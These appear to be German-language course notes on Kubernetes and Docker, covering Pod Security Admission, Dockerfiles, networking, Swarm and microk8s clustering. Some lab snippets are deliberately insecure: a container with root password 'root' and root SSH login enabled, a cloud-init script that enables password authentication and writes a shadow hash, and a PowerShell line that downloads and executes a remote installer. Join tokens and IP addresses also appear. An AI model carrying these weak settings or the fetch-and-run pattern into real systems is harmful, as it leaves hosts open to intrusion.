apiVersion: v1
metadata:
  name: hello
spec:
  selector:
    app: hello
  ports:
    - port: 80
      targetPort: 80
---
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: hello
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: hello
  minReplicas: 2
  maxReplicas: 20
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 80
```

  * https://docs.digitalocean.com/tutorials/cluster-autoscaling-ca-hpa/

### Reference 

  * https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale-walkthrough/#autoscaling-on-more-specific-metrics
  * https://medium.com/expedia-group-tech/autoscaling-in-kubernetes-why-doesnt-the-horizontal-pod-autoscaler-work-for-me-5f0094694054

## Kubernetes Advanced 

### Curl api-server kubernetes aus pod heraus


https://nieldw.medium.com/curling-the-kubernetes-api-server-d7675cfc398c

## Kubernetes - Documentation 

### Documentation zu microk8s plugins/addons

  * https://microk8s.io/docs/addons

### Shared Volumes - Welche gibt es ?

  * https://kubernetes.io/docs/concepts/storage/volumes/

## Kubernetes - Hardening 

### Kubernetes Tipps Hardening


### PSA (Pod Security Admission) 

```
Policies defined by namespace.
e.g. not allowed to run container as root.

Will complain/deny when creating such a pod with that container type

```

### Möglichkeiten in Pods und Containern 

```
## für die Pods
kubectl explain pod.spec.securityContext 
kubectl explain pod.spec.containers.securityContext
```

### Example (seccomp / security context) 

```
A. seccomp - profile
https://github.com/docker/docker/blob/master/profiles/seccomp/default.json

```

```
apiVersion: v1
kind: Pod
metadata:
  name: audit-pod
  labels:
    app: audit-pod
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/audit.json

  containers:

  - name: test-container
    image: hashicorp/http-echo:0.2.3
    args:
    - "-text=just made some syscalls!"
    securityContext:
      allowPrivilegeEscalation: false

```

### SecurityContext (auf Pod Ebene) 

```
kubectl explain pod.spec.containers.securityContext 

```


### NetworkPolicy 

```
## Firewall Kubernetes 
```

### Kubernetes Security Admission Controller Example


### Hintergrund: Warum PSA?

Die `securitycontext-exercise` zeigt, *wie* man Pods korrekt konfiguriert.
Das Problem: SecurityContext ist ein **"Trust the Developer"**-Ansatz. Jeder muss
es jedes Mal richtig machen — und in einem Team mit vielen Entwicklern, unter
Zeitdruck oder bei neuen Mitarbeitern passiert es unvermeidlich, dass jemand
`runAsNonRoot` vergisst, Capabilities nicht droppt oder `allowPrivilegeEscalation`
nicht setzt. Das Ergebnis ist ein root-Container in Produktion, ohne dass jemand
es bemerkt.

PSA ist die **technische Durchsetzung** dieser Anforderungen auf Cluster-Ebene:

- **Kein Vertrauen in die Konfiguration des Einzelnen** — der Cluster lehnt
  nicht-konforme Pods ab, bevor sie starten
- **Sofortiges Feedback** — der Entwickler sieht beim `kubectl apply` exakt,
  was fehlt, nicht erst im Monitoring
- **Defense in Depth** — auch wenn ein Angreifer einen Pod einschleusen kann,
  verhindert PSA, dass er privilegiert laeuft

PSA ist seit Kubernetes 1.25 fest eingebaut — kein zusaetzlicher Controller,
kein Helm Chart, nur Namespace-Labels.

| CIS | Anforderung | PSA-Profil |
|-----|-------------|------------|
| **5.2.1** | Mindestens ein aktiver Policy-Enforcement-Mechanismus | PSA aktivieren |
| 5.2.2 | Keine privilegierten Container | `baseline` / `restricted` |
| 5.2.6 | Kein `allowPrivilegeEscalation` | `restricted` |
| 5.2.7 | Keine Root-Container | `restricted` |

#### Die drei Modi

| Modus | Label | Wirkung |
|-------|-------|---------|
| `enforce` | `pod-security.kubernetes.io/enforce` | Pod wird **abgelehnt** |
| `warn`    | `pod-security.kubernetes.io/warn`    | Pod laeuft, aber **Warnung** im Terminal |
| `audit`   | `pod-security.kubernetes.io/audit`   | Pod laeuft, Verstoss landet im **Audit-Log** |

#### Die drei Profile

| Profil | Beschreibung |
|--------|-------------|
| `privileged` | Keine Einschraenkungen |
| `baseline` | Verhindert bekannte Privilege-Escalation-Vektoren |
| `restricted` | Streng: non-root, no caps, seccomp, kein hostPath |

> **Wichtig:** PSA greift nur auf neue Pods — bereits laufende Container werden nicht nachtraeglich beendet.

---

### Schritt 1: Namespace mit PSA-Labels anlegen

```
cd
mkdir -p manifests/psa
cd manifests/psa
```

```
nano 01-ns.yml
```

```
apiVersion: v1
kind: Namespace
metadata:
  name: psa-restricted
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/audit: restricted
```

```
kubectl apply -f 01-ns.yml
kubectl get namespace psa-restricted --show-labels
```

**Erwartete Ausgabe (Labels sichtbar):**
```
NAME          STATUS   AGE   LABELS
psa-restricted   Active   5s    pod-security.kubernetes.io/enforce=restricted,...
```

---

### Schritt 2: Root-Container wird abgelehnt

```
nano 02-nginx-root.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-root
  namespace: psa-restricted
spec:
  containers:
  - name: nginx
    image: nginx:1.27
```

```
kubectl apply -f 02-nginx-root.yml
```

**Erwartete Ablehnung:**
```
Error from server (Forbidden): pods "nginx-root" is forbidden:
violates PodSecurity "restricted:latest":
  allowPrivilegeEscalation != false (container "nginx" must set
  securityContext.allowPrivilegeEscalation=false),
  unrestricted capabilities (container "nginx" must set
  securityContext.capabilities.drop=["ALL"]),
  runAsNonRoot != true (pod or container "nginx" must set
  securityContext.runAsNonRoot=true),
  seccompProfile (pod or container "nginx" must set
  securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
```

PSA blockiert den Pod direkt beim `kubectl apply` — der Container wird nie gestartet.

---

### Schritt 3: Compliant Pod laeuft durch

```
nano 03-nginx-ok.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-ok
  namespace: psa-restricted
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: nginx
    image: nginxinc/nginx-unprivileged:1.27
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
```

```
kubectl apply -f 03-nginx-ok.yml
kubectl get pod nginx-ok -n psa-restricted
```

**Erwartete Ausgabe:**
```
NAME       READY   STATUS    RESTARTS   AGE
nginx-ok   1/1     Running   0          5s
```

---

### Schritt 4: warn-Modus verstehen

Im `warn`-Modus (`enforce: baseline`) laeuft der Pod durch — der Entwickler sieht
aber sofort die Warnung im Terminal. Gut fuer eine Einfuehrungsphase vor echtem Enforcement.

```
nano 04-ns-warn.yml
```

```
apiVersion: v1
kind: Namespace
metadata:
  name: psa-warn
  labels:
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/audit: restricted
```

```
kubectl apply -f 04-ns-warn.yml
```

```
nano 05-nginx-warn.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-warn
  namespace: psa-warn
spec:
  containers:
  - name: nginx
    image: nginx:1.27
```

```
kubectl apply -f 05-nginx-warn.yml
```

**Erwartete Ausgabe — Pod laeuft, aber Warnung:**
```
Warning: would violate PodSecurity "restricted:latest":
  allowPrivilegeEscalation != false, ...
pod/nginx-warn created
```

---

### Grenzen von PSA — und wann Kyverno oder OPA Gatekeeper

PSA ist in Kubernetes eingebaut und braucht keine zusaetzlichen Komponenten.
Fuer alles darueber hinaus braucht man ein externes Admission-Control-Framework.

| Was PSA nicht kann | Loesung |
|-------------------|---------|
| Nur Images aus erlaubten Registries zulassen | Kyverno / OPA |
| Fehlende SecurityContext automatisch ergaenzen (Mutation) | Kyverno |
| Cluster-weite Policies ohne Namespace-Labels | Kyverno / OPA |
| Custom-Rules (z.B. Labelpflicht fuer alle Deployments) | Kyverno / OPA |
| Nicht-Pod-Ressourcen validieren (Ingress, ConfigMap) | Kyverno / OPA |
| Verschiedene Regeln pro Team / Projekt | Kyverno / OPA |

#### Kyverno vs. OPA Gatekeeper

**Kyverno** — empfohlen fuer die meisten Teams:
- Policies sind normales Kubernetes-YAML — keine neue Sprache
- Unterstuetzt Validation, Mutation und Generation
- Einfach installiert (Helm), grosse Community-Bibliothek mit fertigen Policies
- Gut geeignet fuer: Image-Registry-Restriction, Auto-Labels, Seccomp-Enforcement

**OPA Gatekeeper** — fuer komplexe Anforderungen:
- Policies in Rego (eigene Sprache) — maechtiger, aber steile Lernkurve
- Sinnvoll wenn: OPA bereits fuer andere Systeme im Einsatz ist (z.B. Terraform, Envoy)
- Besser fuer sehr individuelle Unternehmensregelwerke

**Empfehlung:** PSA zuerst aktivieren (kein Overhead, sofort wirksam), dann Kyverno
fuer alles was PSA nicht kann. OPA Gatekeeper nur wenn Rego bereits bekannt ist
oder OPA bereits im Stack vorhanden ist.

---

### Aufraeumen

```
kubectl delete namespace psa-restricted psa-warn
```

---

### Zusammenfassung

| Szenario | Ergebnis |
|----------|----------|
| Root-Container in `enforce: restricted` Namespace | Abgelehnt |
| Root-Container in `warn: restricted` / `enforce: baseline` Namespace | Warnung, laeuft |
| Compliant Pod in `enforce: restricted` Namespace | Laeuft |
| Namespace ohne PSA-Labels | Keine Einschraenkung |

### Referenzen

  * https://kubernetes.io/docs/concepts/security/pod-security-admission/
  * https://kubernetes.io/docs/concepts/security/pod-security-standards/
  * https://kyverno.io/
  * https://open-policy-agent.github.io/gatekeeper/
  * CIS Kubernetes Benchmark V1.12.0, Sektion 5.2

## Kubernetes Interna / Misc.

### OCI,Container,Images Standards


### Schritt 1:

```
cd
mkdir bautest
cd bautest 
```

### Schritt 2:

```
## nano docker-compose.yml
version: "3.8"

services:
  myubuntu:
    build: ./myubuntu
    restart: always
```

### Schritt 3:

```
mkdir myubuntu 
cd myubuntu 
```

```
nano hello.sh
```

```
##!/bin/bash
let i=0

while true
do
  let i=i+1
  echo $i:hello-docker
  sleep 5
done

```

```
## nano Dockerfile 
FROM ubuntu:latest
RUN apt-get update; apt-get install -y inetutils-ping
COPY hello.sh .
RUN chmod u+x hello.sh
CMD ["/hello.sh"]

```

### Schritt 4: 


```
cd ../
## wichtig, im docker-compose - Ordner seiend 
##pwd 
##~/bautest
docker-compose up -d 
## wird image gebaut und container gestartet 

## Bei Veränderung vom Dockerfile, muss man den Parameter --build mitangeben 
docker-compose up -d --build 
```

### Geolocation Kubernetes Cluster

  * https://learnk8s.io/bite-sized/connecting-multiple-kubernetes-clusters

## Docker-Installation

### Installation Docker unter Ubuntu mit snap


```

sudo su -
snap install docker

## for information retrieval 
snap info docker
systemctl list-units
systemctl list-units -t service
systemctl list-units -t service | grep docker

systemctl status snap.docker.dockerd.service
## oder (aber veraltet) 
service snap.docker.dockerd status

systemctl stop snap.docker.dockerd.service
systemctl status snap.docker.dockerd.service
systemctl start snap.docker.dockerd.service 

## wird der docker-dienst beim nächsten reboot oder starten des Server gestartet ? 
systemctl is-enabled snap.docker.dockerd.service

```

### Installation Docker unter SLES 15


### Walkthrough 


```
sudo zypper search -v docker*
sudo zypper install docker

## Dem Nutzer /z.B. Nutzer kurs die Gruppe docker hinzufügen 
## damit auch dieser den Docker-daemon verwenden darf 
sudo groupadd docker
sudo usermod -aG docker $USER

### Unter SLES werden Dienste nicht automatisch aktiviert und gestartet !!! 
## Service für start nach Boot aktivieren 
newgrp docker 
sudo systemctl enable docker.service
## Docker dienst starten 
sudo systemctl start docker.service
```


### Ausführlich mit Ausgaben 

```
sudo zypper search -v docker*

Repository-Daten werden geladen...
Installierte Pakete werden gelesen...

sudo zypper install docker

Dienst 'Basesystem_Module_x86_64' wird aktualisiert.
Dienst 'Containers_Module_x86_64' wird aktualisiert.
Dienst 'Desktop_Applications_Module_x86_64' wird aktualisiert.
Dienst 'Development_Tools_Module_x86_64' wird aktualisiert.
Dienst 'SUSE_Linux_Enterprise_Server_x86_64' wird aktualisiert.
Dienst 'Server_Applications_Module_x86_64' wird aktualisiert.
Repository-Daten werden geladen...
Installierte Pakete werden gelesen...
Paketabhängigkeiten werden aufgelöst...

Das folgende empfohlene Paket wurde automatisch gewählt:
  git-core

Die folgenden 7 NEUEN Pakete werden installiert:
  catatonit containerd docker docker-bash-completion git-core libsha1detectcoll1 runc

7 neue Pakete zu installieren.
Gesamtgröße des Downloads: 52,2 MiB. Bereits im Cache gespeichert: 0 B. Nach der Operation werden zusätzlich 242,1 MiB belegt.
Fortfahren? [j/n/v/...? zeigt alle Optionen] (j): j
Paket libsha1detectcoll1-1.0.3-2.18.x86_64 abrufen                                                                                                                                                                          (1/7),  23,2 KiB ( 45,8 KiB entpackt)
Abrufen: libsha1detectcoll1-1.0.3-2.18.x86_64.rpm .......................................................................................................................................................................................................[fertig]
Paket catatonit-0.1.5-3.3.2.x86_64 abrufen                                                                                                                                                                                  (2/7), 257,2 KiB (696,5 KiB entpackt)
Abrufen: catatonit-0.1.5-3.3.2.x86_64.rpm ...............................................................................................................................................................................................................[fertig]
Paket runc-1.1.4-150000.33.4.x86_64 abrufen                                                                                                                                                                                 (3/7),   2,6 MiB (  9,1 MiB entpackt)
Abrufen: runc-1.1.4-150000.33.4.x86_64.rpm ..............................................................................................................................................................................................................[fertig]
Paket containerd-1.6.6-150000.73.2.x86_64 abrufen                                                                                                                                                                           (4/7),  17,7 MiB ( 74,2 MiB entpackt)
Abrufen: containerd-1.6.6-150000.73.2.x86_64.rpm ........................................................................................................................................................................................................[fertig]
Paket git-core-2.35.3-150300.10.15.1.x86_64 abrufen                                                                                                                                                                         (5/7),   4,8 MiB ( 26,6 MiB entpackt)
Abrufen: git-core-2.35.3-150300.10.15.1.x86_64.rpm ......................................................................................................................................................................................................[fertig]
Paket docker-20.10.17_ce-150000.166.1.x86_64 abrufen                                                                                                                                                                        (6/7),  26,6 MiB (131,4 MiB entpackt)
Abrufen: docker-20.10.17_ce-150000.166.1.x86_64.rpm .....................................................................................................................................................................................................[fertig]
Paket docker-bash-completion-20.10.17_ce-150000.166.1.noarch abrufen                                                                                                                                                        (7/7), 121,3 KiB (113,6 KiB entpackt)
Abrufen: docker-bash-completion-20.10.17_ce-150000.166.1.noarch.rpm .....................................................................................................................................................................................[fertig]

Überprüfung auf Dateikonflikte läuft: ...................................................................................................................................................................................................................[fertig]
(1/7) Installieren: libsha1detectcoll1-1.0.3-2.18.x86_64 ................................................................................................................................................................................................[fertig]
(2/7) Installieren: catatonit-0.1.5-3.3.2.x86_64 ........................................................................................................................................................................................................[fertig]
(3/7) Installieren: runc-1.1.4-150000.33.4.x86_64 .......................................................................................................................................................................................................[fertig]
(4/7) Installieren: containerd-1.6.6-150000.73.2.x86_64 .................................................................................................................................................................................................[fertig]
(5/7) Installieren: git-core-2.35.3-150300.10.15.1.x86_64 ...............................................................................................................................................................................................[fertig]
Updating /etc/sysconfig/docker ...
(6/7) Installieren: docker-20.10.17_ce-150000.166.1.x86_64 ..............................................................................................................................................................................................[fertig]
(7/7) Installieren: docker-bash-completion-20.10.17_ce-150000.166.1.noarch ..............................................................................................................................................................................[fertig]

sudo groupadd docker
sudo usermod -aG docker $USER
// logout

newgrp docker 
sudo systemctl enable docker.service
sudo systemctl start docker.service
```

## Dockerfile - Examples 

### Nginx mit content aus html-ordner


### Schritt 1: Simple Example 

```
## das gleich wie cd ~
## Heimatverzeichnis des Benutzers root 
cd
mkdir nginx-test
cd nginx-test
mkdir html
cd html/
vi index.html

```

```
Text, den du rein haben möchtest 
```

```
cd ..
vi Dockerfile 
```

```
FROM nginx:latest
COPY html /usr/share/nginx/html
```

```
## nameskürzel z.B. jm1 
docker build -t nginx-test  . 
docker images

```



### Schritt 2: docker laufen lassen

```
## und direkt aus der Registry wieder runterladen 
docker run --name hello-web -p 8080:80 -d nginx-test

## laufenden Container anzeigen lassen
docker container ls 
## oder alt: deprecated 
docker ps 

curl http://localhost:8080 


## 
docker rm -f hello-web 

```

### ssh server


```
cd 
mkdir devubuntu
cd devubuntu 
## vi Dockerfile 
```

```Dockerfile
FROM ubuntu:latest

RUN apt-get update && \
    DEBIAN_FRONTEND="noninteractive" apt-get install -y inetutils-ping openssh-server && \
    rm -rf /var/lib/apt/lists/*

RUN mkdir /run/sshd && \
    echo 'root:root' | chpasswd && \
    sed -ri 's/^#?PermitRootLogin\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -ri 's/UsePAM yes/#UsePAM yes/g' /etc/ssh/sshd_config && \
    mkdir /root/.ssh

EXPOSE 22/tcp

CMD ["/usr/sbin/sshd","-D"]
```

```
docker build -t devubuntu . 
docker run --name=devjoy -p 2222:22  -d -t devubuntu3

ssh root@localhost -p 2222
## example, if your docker host ist 192.168.56.101 v
ssh root@192.168.56.101 -p 2222
```

## Docker-Container Examples 

### 2 Container mit Netzwerk anpingen


```
clear
docker run --name dockerserver1 -dit ubuntu
docker run --name dockerserver2 -dit ubuntu
docker network ls
docker network inspect bridge
## dockerserver1 - 172.17.0.2
## dockerserver2 - 172.17.0.3
docker container ls
docker exec -it dockerserver1 bash
## im container 
apt update; apt install -y iputils-ping 
ping 172.17.0.3 
```

### Container mit eigenem privatem Netz erstellen


```
clear
## use bridge as type
## docker network create -d bridge test_net
## by bridge is default 
docker network create test_net
docker network ls
docker network inspect test_net

## Container mit netzwerk starten 
docker container run -d --name nginx1 --network test_net nginx
docker network inspect test_net

## Weiteres Netzwerk (bridged) erstellen
docker network create demo_net
docker network connect demo_net nginx1

## Analyse 
docker network inspect demo_net
docker inspect nginx1

## Verbindung lösen 
docker network disconnect demo_net nginx1

## Schauen, wir das Netz jetzt aussieht 
docker network inspect demo_net

```

## Docker-Netzwerk 

### Netzwerk


### Übersicht

```
3 Typen 

o none
o bridge (Standard-Netzwerk) 
o host 

### Additionally possible to install
o overlay (needed for multi-node)

```


### Kommandos 

```
## Netzwerk anzeigen 
docker network ls 

## bridge netzwerk anschauen 
## Zeigt auch ip der docker container an  
docker inspect bridge

## im container sehen wir es auch
docker inspect ubuntu-container 

```

### Eigenes Netz erstellen 

```
docker network create -d bridge test_net 
docker network ls 

docker container run -d --name nginx --network test_net nginx
docker container run -d --name nginx_no_net --network none nginx 

docker network inspect none 
docker network inspect test_net 

docker inspect nginx 
docker inspect nginx_no_net 

```

### Netzwerk rausnehmen / hinzufügen 

```
docker network disconnect none nginx_no_net
docker network connect test_net nginx_no_net 

### Das Löschen von Netzwerken ist erst möglich, wenn es keine Endpoints 
### d.h. container die das Netzwerk verwenden 
docker network rm test_net 
```



## Docker Security 

### Scanning docker image with docker scan/snyx


### Prerequisites 

```
You need to be logged in on docker hub with docker login 
(with your account credentials
```


### Example 

```
## Snyk (docker scan) 
docker help scan
docker scan --json --accept-license dockertrainereu/jm-hello-docker  > result.json
```

## Docker Compose

### yaml-format


```
## Kommentare 

## Listen 
- rot
- gruen
- blau 

## Mappings 
Version: 3.7 

## Mappings können auch Listen enthalten 
expose: 
  - "3000"
  - "8000" 

## Verschachtelte Mappings 
build:
  context: .
  labels: 
    label1: "bunt"
    label2: "hell" 

```

### Example with Ubuntu and Dockerfile


### Schritt 1:

```
cd
mkdir bautest
cd bautest 
```

### Schritt 2:

```
## nano docker-compose.yml
version: "3.8"

services:
  myubuntu:
    build: ./myubuntu
    restart: always
```

### Schritt 3:

```
mkdir myubuntu 
cd myubuntu 
```

```
nano hello.sh
```

```
##!/bin/bash
let i=0

while true
do
  let i=i+1
  echo $i:hello-docker
  sleep 5
done

```

```
## nano Dockerfile 
FROM ubuntu:latest
RUN apt-get update; apt-get install -y inetutils-ping
COPY hello.sh .
RUN chmod u+x hello.sh
CMD ["/hello.sh"]

```

### Schritt 4: 


```
cd ../
## wichtig, im docker-compose - Ordner seiend 
##pwd 
##~/bautest
docker compose up -d 
## wird image gebaut und container gestartet 

## Bei Veränderung vom Dockerfile, muss man den Parameter --build mitangeben 
docker compose up -d --build 
```

### docker-compose und replicas


### Beispiel 

```
version: "3.9"
services:
  redis:
    image: redis:latest
    deploy:
      replicas: 1
    configs:
      - my_config
      - my_other_config
configs:
  my_config:
    file: ./my_config.txt
  my_other_config:
    external: true
```
### Ref:

  * https://docs.docker.com/compose/compose-file/compose-file-v3/

### docker compose Reference

  * https://docs.docker.com/compose/compose-file/compose-file-v3/

## Docker Swarm 

### Docker Swarm Beispiele


### Generic examples 

```
## should be at least version 1.24 
docker info

## only for one network interface
docker swarm init

## in our case, we need to decide what interface
docker swarm init --advertise-addr 192.168.56.101

## is swarm active 
docker info | grep -i swarm
## When it is -> node command works 
docker node ls
## is the current node the manager 
docker info | grep -i "is manager"

## docker create additional overlay network 
docker network ls

## what about my own node -> self
docker node inspect self
docker node inspect --pretty self
docker node inspect --pretty self | less

```

```
## Create our first service 
docker service create redis
docker images
docker service ls
## if service-id start with  j 
docker service inspect j
docker service ps j
docker service rm j
docker service ls
```

```
## Start with multiple replicas and name 
docker service create --name my_redis --replicas 4 redis
docker service ls
## Welche tasks 
docker service ps my_redis
docker container ls
docker service inspect my_redis

## delete service
docker service rm
```

### Add additional node 

```
## on first node, get join token 
docker swarm join-token manager

## on second node execute join command
docker swarm join --token SWMTKN-1-07jy3ym29au7u3isf1hfhgd7wpfggc1nia2kwtqfnfc8hxfczw-2kuhwlnr9i0nkje8lz437d2d5 192.168.56.101:2377

## check with node command
docker node ls 

## Make node a simple worker
## Does not make, because no highavailable after crush node 1
## Take at LEAST 3 NODES 
docker node demote <node-name>

```

### expose port

```
docker service create --name my_web \
                        --replicas 3 \
                        --publish published=8080,target=80 \
                        nginx
```

### Ref 

  * https://docs.docker.com/engine/swarm/services/

## Docker - Dokumentation 

### Vulnerability Scanner with docker

  * https://docs.docker.com/engine/scan/#prerequisites

### Vulnerability Scanner mit snyk

  * https://snyk.io/plans/

### Parent/Base - Image bauen für Docker

  * https://docs.docker.com/develop/develop-images/baseimages/

## Kubernetes - Überblick

### Installation - Welche Komponenten from scratch


### Step 1: Server 1 (manuell installiert -> microk8s)

```
## Installation Ubuntu - Server 

## cloud-init script 
## s.u. BASIS (keine Voraussetzung - nur zum Einrichten des Nutzers 11trainingdo per ssh) 

## Server 1 - manuell 
## Ubuntu 20.04 LTS - Grundinstallation 

## minimal Netzwerk - öffentlichen IP 
## nichts besonderes eingerichtet - Standard Digitalocean 

## Standard vo Installation microk8s 
lo               UNKNOWN        127.0.0.1/8 ::1/128
## public ip / interne 
eth0             UP             164.92.255.234/20 10.19.0.6/16 fe80::c:66ff:fec4:cbce/64
## private ip 
eth1             UP             10.135.0.3/16 fe80::8081:aaff:feaa:780/64

snap install microk8s --classic 
## namensaufloesung fuer pods 
microk8s enable dns 

```

```
## Funktioniert microk8s 
microk8s status
```

### Steps 2: Server 2+3 (automatische Installation -> microk8s ) 

```
## Was macht das ? 
## 1. Basisnutzer (11trainingdo) - keine Voraussetzung für microk8s
## 2. Installation von microk8s 
##.>>>>>>> microk8s installiert <<<<<<<<
## - snap install --classic microk8s 
## >>>>>>> Zuordnung zur Gruppe microk8s - notwendig für bestimmte plugins (z.B. helm)  
## usermod -a -G microk8s root 
## >>>>>>> Setzen des .kube - Verzeichnisses auf den Nutzer microk8s -> nicht zwingend erforderlich 
## chown -r -R microk8s ~/.kube 
## >>>>>>> REQUIRED .. DNS aktivieren, wichtig für Namensauflösungen innerhalb der PODS
## >>>>>>> sonst funktioniert das nicht !!! 
## microk8s enable dns 
## >>>>>>> kubectl alias gesetzt, damit man nicht immer microk8s kubectl eingeben muss
## - echo "alias kubectl='microk8s kubectl'" >> /root/.bashrc

## cloud-init script 
## s.u. MITMICROK8S (keine Voraussetzung - nur zum Einrichten des Nutzers 11trainingdo per ssh) 
##cloud-config
users:
  - name: 11trainingdo
    shell: /bin/bash

runcmd:
  - sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/g" /etc/ssh/sshd_config
  - echo " " >> /etc/ssh/sshd_config 
  - echo "AllowUsers 11trainingdo" >> /etc/ssh/sshd_config 
  - echo "AllowUsers root" >> /etc/ssh/sshd_config 
  - systemctl reload sshd 
  - sed -i '/11trainingdo/c 11trainingdo:$6$HeLUJW3a$4xSfDFQjKWfAoGkZF3LFAxM4hgl3d6ATbr2kEu9zMOFwLxkYMO.AJF526mZONwdmsm9sg0tCBKl.SYbhS52u70:17476:0:99999:7:::' /etc/shadow
  - echo "11trainingdo ALL=(ALL) ALL" > /etc/sudoers.d/11trainingdo
  - chmod 0440 /etc/sudoers.d/11trainingdo
  
  - echo "Installing microk8s"
  - snap install --classic microk8s
  - usermod -a -G microk8s root
  - chown -f -R microk8s ~/.kube
  - microk8s enable dns 
  - echo "alias kubectl='microk8s kubectl'" >> /root/.bashrc
```
```
## Prüfen ob microk8s - wird automatisch nach Installation gestartet
## kann eine Weile dauern
microk8s status

```

### Step 3: Client - Maschine (wir sollten nicht auf control-plane oder cluster - node arbeiten

```
Weiteren Server hochgezogen. 
Vanilla + BASIS 

## Installation Ubuntu - Server 

## cloud-init script 
## s.u. BASIS (keine Voraussetzung - nur zum Einrichten des Nutzers 11trainingdo per ssh) 

## Server 1 - manuell 
## Ubuntu 20.04 LTS - Grundinstallation 

## minimal Netzwerk - öffentlichen IP 
## nichts besonderes eingerichtet - Standard Digitalocean 

## Standard vo Installation microk8s 
lo               UNKNOWN        127.0.0.1/8 ::1/128
## public ip / interne 
eth0             UP             164.92.255.232/20 10.19.0.6/16 fe80::c:66ff:fec4:cbce/64
## private ip 
eth1             UP             10.135.0.5/16 fe80::8081:aaff:feaa:780/64

```

```
##### Installation von kubectl aus dem snap
## NICHT .. keine microk8s - keine control-plane / worker-node 
## NUR Client zum Arbeiten 
snap install kubectl --classic 

##### .kube/config 
## Damit ein Zugriff auf die kube-server-api möglich
## d.h. REST-API Interface, um das Cluster verwalten.
## Hier haben uns für den ersten Control-Node entschieden
## Alternativ wäre round-robin per dns möglich 

## Mini-Schritt 1:
## Auf dem Server 1: kubeconfig ausspielen 
microk8s config > /root/kube-config 
## auf das Zielsystem gebracht (client 1) 
scp /root/kubeconfig 11trainingdo@10.135.0.5:/home/11trainingdo

## Mini-Schritt 2:
## Auf dem Client 1 (diese Maschine) kubeconfig an die richtige Stelle bringen 
## Standardmäßig der Client nach eine Konfigurationsdatei sucht in ~/.kube/config 
sudo su -
cd 
mkdir .kube 
cd .kube 
mv /home/11trainingdo/kube-config config 

## Verbindungstest gemacht
## Damit feststellen ob das funktioniert. 
kubectl cluster-info 

```

### Schritt 4: Auf allen Servern IP's hinterlegen und richtigen Hostnamen überprüfen 

```
## Auf jedem Server 
hostnamectl 
## evtl. hostname setzen 
## z.B. - auf jedem Server eindeutig 
hostnamectl set-hostname n1.training.local 

## Gleiche hosts auf allen server einrichten.
## Wichtig, um Traffic zu minimieren verwenden, die interne (private) IP

/etc/hosts 
10.135.0.3 n1.training.local n1
10.135.0.4 n2.training.local n2
10.135.0.5 n3.training.local n3 

```

### Schritt 5: Cluster aufbauen 

```
## Mini-Schritt 1:
## Server 1: connection - string (token) 
microk8s add-node 
## Zeigt Liste und wir nehmen den Eintrag mit der lokalen / öffentlichen ip
## Dieser Token kann nur 1x verwendet werden und wir auf dem ANDEREN node ausgeführt
## microk8s join 10.135.0.3:25000/e9cdaa11b5d6d24461c8643cdf107837/bcad1949221a

## Mini-Schritt 2:
## Dauert eine Weile, bis das durch ist. 
## Server 2: Den Node hinzufügen durch den JOIN - Befehl 
microk8s join 10.135.0.3:25000/e9cdaa11b5d6d24461c8643cdf107837/bcad1949221a

## Mini-Schritt 3:
## Server 1: token besorgen für node 3
microk8s add-node 

## Mini-Schritt 4:
## Server 3: Den Node hinzufügen durch den JOIN-Befehl 
microk8s join 10.135.0.3:25000/09c96e57ec12af45b2752fb45450530c/bcad1949221a

## Mini-Schritt 5: Überprüfen ob HA-Cluster läuft 
Server 1: (es kann auf jedem der 3 Server überprüft werden, auf einem reicht 
microk8s status | grep high-availability 
high-availability: yes 
```

### Ergänzend nicht notwendige Scripte 

```
## cloud-init script 
## s.u. BASIS (keine Voraussetzung - nur zum Einrichten des Nutzers 11trainingdo per ssh) 

## Digitalocean - unter user_data reingepastet beim Einrichten 

##cloud-config
users:
  - name: 11trainingdo
    shell: /bin/bash

runcmd:
  - sed -i "s/PasswordAuthentication no/PasswordAuthentication yes/g" /etc/ssh/sshd_config
  - echo " " >> /etc/ssh/sshd_config 
  - echo "AllowUsers 11trainingdo" >> /etc/ssh/sshd_config 
  - echo "AllowUsers root" >> /etc/ssh/sshd_config 
  - systemctl reload sshd 
  - sed -i '/11trainingdo/c 11trainingdo:$6$HeLUJW3a$4xSfDFQjKWfAoGkZF3LFAxM4hgl3d6ATbr2kEu9zMOFwLxkYMO.AJF526mZONwdmsm9sg0tCBKl.SYbhS52u70:17476:0:99999:7:::' /etc/shadow
  - echo "11trainingdo ALL=(ALL) ALL" > /etc/sudoers.d/11trainingdo
  - chmod 0440 /etc/sudoers.d/11trainingdo
```

## Kubernetes - microk8s (Installation und Management) 

### kubectl unter windows - Remote-Verbindung zu Kuberenets (microk8s) einrichten


### Walkthrough (Installation)

```
## Step 1
chocolatry installiert. 
(powershell als Administrator ausführen)
## https://docs.chocolatey.org/en-us/choco/setup
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

## Step 2
choco install kubernetes-cli 

## Step 3
testen:
kubectl version --client 

## Step 4:
## powershell als normaler benutzer öffnen 
```

### Walkthrough (autocompletion) 

```
in powershell (normaler Benutzer) 
kubectl completion powershell | Out-String | Invoke-Expression
```

### kubectl - config - Struktur vorbereiten  

```
## in powershell im heimatordner des Benutzers .kube - ordnern anlegen
## C:\Users\<dein-name>\
mkdir .kube 
cd .kube 
```

### IP von Cluster-Node bekommen 

```
## auf virtualbox - maschine per ssh einloggen 
